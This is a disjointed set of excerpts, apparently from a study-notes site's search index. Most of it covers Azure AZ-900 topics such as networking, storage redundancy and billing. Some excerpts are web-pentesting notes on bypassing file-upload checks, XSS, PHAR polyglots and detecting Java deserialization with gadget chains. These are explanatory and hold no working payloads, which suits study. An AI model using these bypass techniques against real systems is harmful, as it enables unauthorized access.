In an Infrastructure as a Service (IaaS) model, the cloud service provider, in this case Microsoft Azure, is responsible for managing the underlying physical hardware. This includes servers, storage, networking hardware, and the virtualization layer. Azure ensures that these resources are available and maintained, providing capabilities like automated backup, disaster recovery, and scaling. The customer, on the other hand, is responsible for managing the software components of the service, including the operating system, middleware, runtime, data, and applications. This arrangement allows customers to focus on their core business and application development without worrying about the physical infrastructure's procurement, management, and maintenance. It's important to remember that the division of responsibilities may change in other service models like Platform as a Service (PaaS) or Software as a Service (SaaS), where the cloud service provider manages more layers of the technology stack. But for IaaS, the provider indeed manages the hardware, making the statement TRUE.

For name resolution, you can use the name resolution service that's built into Azure. You also can configure the virtual network to use either an internal or an external DNS server.</p> <p>Internet communications: You can enable incoming connections from the internet by assigning a public IP address to an Azure resource, or putting the resource behind a public load balancer.</p> <p>Communicate between Azure resources: Enable Azure resources to communicate securely with each other. Virtual networks can connect not only VMs but other Azure resources. Service endpoints can connect to other Azure resource types.</p> <p>Communicate with on-premises resources: Azure virtual networks enable you to link resources together in your on-premises environment and within your Azure subscription.     - Point-to-site virtual private network connections are from a computer outside your organization back into your corporate network. In this case, the client computer initiates an encrypted VPN connection to connect to the Azure virtual network.     - Site-to-site virtual private networks link your on-premises VPN device or gateway to the Azure VPN gateway in a virtual network. In effect, the devices in Azure can appear as being on the local network. The connection is encrypted and works over the internet.     - Azure ExpressRoute provides a dedicated private connectivity to Azure that doesn't travel over the internet. ExpressRoute is useful for environments where you need greater bandwidth and even higher levels of security.</p> <p>Route network traffic: By default, Azure routes traffic between subnets on any connected virtual networks, on-premises networks, and the internet. Route tables allow you to define rules about how traffic should be directed. Border Gateway Protocol (BGP) works with Azure VPN gateways, Azure Route Server, or Azure ExpressRoute to propagate on-premises BGP routes to Azure virtual networks.</p> <p>Filter network traffic: filter traffic between subnets. - Network security groups are Azure resources that can contain multiple inbound and outbound security rules. You can define these rules to allow or block traffic, based on factors such as source and destination IP address, port, and protocol. - Network virtual appliances are specialized VMs that can be compared to a hardened network appliance. A network virtual appliance carries out a particular network function, such as running a firewall or performing wide area network (WAN) optimization.</p> <p>Connect virtual networks:  You can link virtual networks together by using virtual network peering. Peering allows two virtual networks to connect directly to each other. Network traffic between peered networks is private, and travels on the Microsoft backbone network, never entering the public internet. Peering enables resources in each virtual network to communicate with each other. These virtual networks can be in separate regions, which allows you to create a global interconnected network through Azure.</p> <p>User-defined routes (UDR) allow you to control the routing tables between subnets within a virtual network or between virtual networks.

In this configuration, you assign a unique public IP address to each instance. You then create separate tunnels from the on-premises device to each IP address. </p> <p>ExpressRoute failover: Another high-availability option is to configure a VPN gateway as a secure failover path for ExpressRoute connections. ExpressRoute circuits have resiliency built in. However, they aren't immune to physical problems that affect the cables delivering connectivity or outages that affect the complete ExpressRoute location. </p> <p>Zone-redundant gateways: In regions that support availability zones, VPN gateways and ExpressRoute gateways can be deployed in a zone-redundant configuration.

The paired secondary region is based on Azure Region Pairs, and can't be changed.</p> <p>By default, data in the secondary region isn't available for read or write access unless there's a failover to the secondary region. If the primary region becomes unavailable, you can choose to fail over to the secondary region. After the failover has completed, the secondary region becomes the primary region, and you can again read and write data.</p> <p>Because data is replicated to the secondary region asynchronously, a failure that affects the primary region may result in data loss if the primary region can't be recovered. The interval between the most recent writes to the primary region and the last write to the secondary region is known as the recovery point objective (RPO). The RPO indicates the point in time to which data can be recovered. Azure Storage typically has an RPO of less than 15 minutes, although there's currently no SLA on how long it takes to replicate data to the secondary region.</p> <p>Azure Storage offers two options for copying your data to a secondary region: geo-redundant storage (GRS) and geo-zone-redundant storage (GZRS). GRS is similar to running LRS in two regions, and GZRS is similar to running ZRS in the primary region and LRS in the secondary region.</p> <p>Geo-redundant storage (GRS)</p> <p>GRS copies your data synchronously three times within a single physical location in the primary region using LRS. It then copies your data asynchronously to a single physical location in the secondary region (the region pair) using LRS. GRS offers durability for Azure Storage data objects of at least 16 nines (99.99999999999999%) over a given year.</p> <p></p> <p>Geo-zone-redundant storage (GZRS)</p> <p>GZRS combines the high availability provided by redundancy across availability zones with protection from regional outages provided by geo-replication. Data in a GZRS storage account is copied across three Azure availability zones in the primary region (similar to ZRS) and is also replicated to a secondary geographic region, using LRS, for protection from regional disasters. Microsoft recommends using GZRS for applications requiring maximum consistency, durability, and availability, excellent performance, and resilience for disaster recovery. GZRS is designed to provide at least 16 nines (99.99999999999999%) of durability of objects over a given year.</p> <p></p> <p>Read access to data in the secondary region (RA-GRS)</p> <p>Geo-redundant storage (with GRS or GZRS) replicates your data to another physical location in the secondary region to protect against regional outages. However, that data is available to be read only if the customer or Microsoft initiates a failover from the primary to secondary region. However, if you enable read access to the secondary region, your data is always available, even when the primary region is running optimally. For read access to the secondary region, enable read-access geo-redundant storage (RA-GRS) or read-access geo-zone-redundant storage (RA-GZRS). Remember that the data in your secondary region may not be up-to-date due to RPO.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-storage-services_1","title":"Azure storage services","text":"<ul> <li> <ol> <li>Azure Blobs: A massively scalable object store for text and binary data.

BUT it's specific to Windows Server and SQL server, not to all Microsoft licenses that your organization owns.</li> </ul> <p>The OpEx cost can be impacted by many factors: </p> <ul> <li>Resource type: When you provision an Azure resource, Azure creates metered instances for that resource. The meters track the resources' usage and generate a usage record that is used to calculate your bill. Meters: Azure creates automatically usage meters when you deploy a resource, so you can track service usage. Usage captured by each usage meter results in a certain number of billable units, and those billable units are converted to charges based on resource types. One billable unit for a particular service will be different in value from the value of a billable unit for another service.</li> <li>Uptime.</li> <li>Consumption: Pay-as-you-go payment model where you pay for the resources that you use during a billing cycle. Azure also offers the ability to commit to using a set amount of cloud resources. When you reserve capacity, you\u2019re committing to using and paying for a certain amount of Azure resources during a given period (typically one or three years).</li> <li>Geography or resource allocation: The cost of power, labor, taxes, and fees vary depending on the location. Due to these variations, Azure resources can differ in costs to deploy depending on the region. </li> <li>Network Traffic: Bandwidth refers to data moving in and out of Azure datacenters. Some inbound data transfers (data going into Azure datacenters) are free. For outbound data transfers (data leaving Azure datacenters), data transfer pricing is based on zones.</li> <li>Subscription type: Some Azure subscription types also include usage allowances, which affect costs.</li> <li>Azure Marketplace: Azure Marketplace lets you purchase Azure-based solutions and services from third-party vendors. Try to avoid recurring costs associated with an offering from a third provider at Azure Marketplace.</li> </ul> <p>Additionally it's necessary paying attention to small details such as, for example, every time you provision a VM, additional resources such as storage and networking are also provisioned.

This health check will be a checkpoint for the load balancer to decide whether to route the traffic to the instance or not.

This can have serious consequences, including unauthorized access to sensitive data, server compromise, and even complete system control. The vulnerability arises when the application fails to properly validate and secure the uploaded files. This means that the application may not check if the uploaded file is actually of the expected type (e.g., image, PDF), or it may not restrict the file's location or execution on the server.</p> <p>Exploitation: An attacker identifies the file upload functionality in the target  application and attempts to upload a malicious file. This file can be crafted to include malicious code, such as PHP scripts, shell commands, or malware.</p> <p>Bypassing Validation: If the application doesn't properly validate file types or restricts file locations, the attacker can upload a file with a misleading extension (e.g., uploading a PHP file with a .jpg extension).</p>","tags":["pentesting","web","pentesting"]},{"location":"webexploitation/arbitrary-file-upload/#bypass-file-upload-restrictions","title":"Bypass file upload restrictions","text":"<p>Uploaded files represent a significant risk to applications.

This vulnerability is typically caused by a lack of input sanitization/validation in web applications. Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser. XSS vulnerabilities affect web applications that lack input validation and leverage client-side scripting languages like Javascript, Flash, CSS etc. </p> <p>There are many other types of XSS attacks, from Bitcoin mining to displaying ads. 2As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution.</p> <pre><code># Quick steps to test XSS \n# 1.

This is equivalent to granting everyone access to the resource. Basic Basic authentication sends a Base64-encoded string that contains a user name and password for the client. Base64 is not a form of encryption and should be considered the same as sending the user name and password in clear text. If a resource needs to be protected, strongly consider using an authentication scheme other than basic authentication. Digest Digest authentication is a challenge-response scheme that is intended to replace Basic authentication. The server sends a string of random data called a nonce to the client as a challenge. The client responds with a hash that includes the user name, password, and nonce, among additional information. The complexity this exchange introduces and the data hashing make it more difficult to steal and reuse the user's credentials with this authentication scheme. Digest authentication requires the use of Windows domain accounts. The digest realm is the Windows domain name. Therefore, you cannot use a server running on an operating system that does not support Windows domains, such as Windows XP Home Edition, with Digest authentication. Conversely, when the client runs on an operating system that does not support Windows domains, a domain account must be explicitly specified during the authentication. NTLM NT LAN Manager (NTLM) authentication is a challenge-response scheme that is a securer variation of Digest authentication. NTLM uses Windows credentials to transform the challenge data instead of the unencoded user name and password. NTLM authentication requires multiple exchanges between the client and server. The server and any intervening proxies must support persistent connections to successfully complete the authentication. Negotiate Negotiate authentication automatically selects between the Kerberos protocol and NTLM authentication, depending on availability. The Kerberos protocol is used if it is available; otherwise, NTLM is tried. Kerberos authentication significantly improves upon NTLM. Kerberos authentication is both faster than NTLM and allows the use of mutual authentication and delegation of credentials to remote machines. Windows Live ID The underlying Windows HTTP service includes authentication using federated protocols. However, the standard HTTP transports in WCF do not support the use of federated authentication schemes, such as Microsoft Windows Live ID.

Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:   - The\u00a0<code>URLDNS</code>\u00a0chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.   - <code>JRMPClient</code>\u00a0is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.</p> Burpsuite lab <p>Burpsuite Lab: Exploiting Java deserialization with Apache Commons</p>","tags":["web","pentesting","attack"]},{"location":"webexploitation/insecure-deserialization/#documented-gadget-chains","title":"Documented gadget chains","text":"<p>There may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application.

One approach is to use an image upload functionality, for example. If you are able to create a polyglot file, with a\u00a0<code>PHAR</code>\u00a0masquerading as a simple\u00a0<code>JPG</code>, you can sometimes bypass the website's validation checks.

They also handle aspects like data security, transaction  Management, and concurrency control to ensure data integrity and consistency.</p> <p>The following are examples of popular DBMS (Database Management Systems):</p> <ul> <li>MySQL - A free, open-source relational database management system that is widely used for web applications.</li> <li>PostgreSQL - Another popular open-source relational database management system that is known for its advanced features and reliability. </li> <li>Oracle Database - A commercial relational database management system developed by Oracle Corporation that is widely used in enterprise applications.</li> <li>Microsoft SQL Server - A commercial relational database  Management system developed.</li> </ul> <p>How relational databases work:  </p> <ul> <li> <p>Tables: The basic building blocks of a relational database are tables, also known as relations. A table consists of rows (also called records or tuples) and columns (also known as attributes). Each row represents a unique record or instance of an entity, and each column represents a specific attribute or characteristic of that entity.</p> </li> <li> <p>Keys: Keys are used to uniquely identify records within a table and establish relationships between tables. The primary key is a column or set of columns that uniquely identifies each row in a table. It ensures the integrity and uniqueness of the data. Foreign keys are columns in one table that reference the primary key of another table, establishing relationships between the tables.</p> </li> <li> <p>Relationships: Relationships define how tables are connected or associated with each other. Common types of relationships include one-to-one, one-to-many, and many-to-many. These relationships are established using primary and foreign keys, allowing data to be linked and retrieved across multiple tables.</p> </li> <li> <p>Structured Query Language (SQL): Relational databases are typically accessed and manipulated using the  Structured Query Language (SQL). SQL provides a standardized language for querying, inserting, updating, and deleting data from relational databases. It allows users to perform operations such as retrieving specific records, filtering data based on conditions, joining tables to combine data, and aggregating data using functions.</p> </li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#2-nosql","title":"2. NoSQL","text":"<p>[NoSQL] (Not Only SQL) databases are a type of database management system that differ from traditional relational databases (RDBMS) in terms of data model, scalability, and flexibility. NoSQL databases are designed to handle large volumes of unstructured, semi-structured, and rapidly changing data. NoSQL databases are commonly used in modern web applications, big data analytics, real-time streaming, content management systems, and other scenarios where the flexibility, scalability, and performance advantages they offer are valuable.</p> <p>There are several popular NoSQL databases available, each with its own strengths and use cases. Here are some examples of well-known NoSQL databases:</p> <ul> <li>MongoDB: MongoDB is a document database that stores data in flexible, JSON-like documents. It provides scalability, high performance, and rich query capabilities. MongoDB is widely used in web applications, content management systems, and real-time analytics. It uses MQL (MongoDB Query Language).</li> <li>Redis: Redis is an in-memory data store that supports various data structures, including strings, hashes, lists, sets, and sorted sets. It is known for its exceptional performance and low latency. Redis is often used for caching, real-time analytics, session management, and pub/sub messaging.</li> <li>Amazon DynamoDB.</li> <li>CouchBase Server.</li> <li>Apache Cassandra: Distributed columnar database designed to handle large amounts of data across multiple commodity servers.
